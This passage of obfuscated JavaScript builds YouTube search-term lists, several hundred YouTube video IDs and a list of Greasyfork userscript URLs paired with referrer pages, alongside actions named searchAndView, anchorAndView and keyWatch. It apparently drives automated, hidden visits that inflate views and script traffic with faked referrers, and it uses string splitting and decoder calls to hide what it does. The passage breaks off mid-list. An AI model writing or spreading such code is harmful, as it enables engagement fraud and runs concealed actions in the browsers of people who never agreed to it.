+ 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x1 * -0xc2b + 0x1 * 0x2407 + -0x17d2)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x5b1 * 0x2 + -0x6f * 0x17 + -0x15f)), searchTerms[X(0x11)](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + Y(0x4) + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x10 * -0x36 + -0x179 * 0xa + 0xb5d);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    Z(0x7, 'Xw]@') + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    Y(0x16) + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    Z(0x6, 'Jx&W') + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + X(0xb) + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + Z(0x9, 'tcs$') + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
